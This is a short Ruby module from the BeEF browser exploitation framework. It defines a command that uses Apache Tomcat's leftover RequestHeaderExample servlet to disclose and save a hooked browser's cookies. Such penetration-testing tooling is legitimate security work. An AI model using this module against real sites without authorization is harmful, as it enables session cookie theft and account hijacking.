#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - https://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Apache_tomcat_examples_cookie_disclosure < BeEF::Core::Command
  def self.options
    [
      { 'name' => 'request_header_servlet_path', 'ui_label' => "'Request Header Example' path", 'value' => '/examples/servlets/servlet/RequestHeaderExample' }
    ]
  end

  def post_execute
    content = {}
    content['cookies'] = @datastore['cookies']
    save content
  end
end
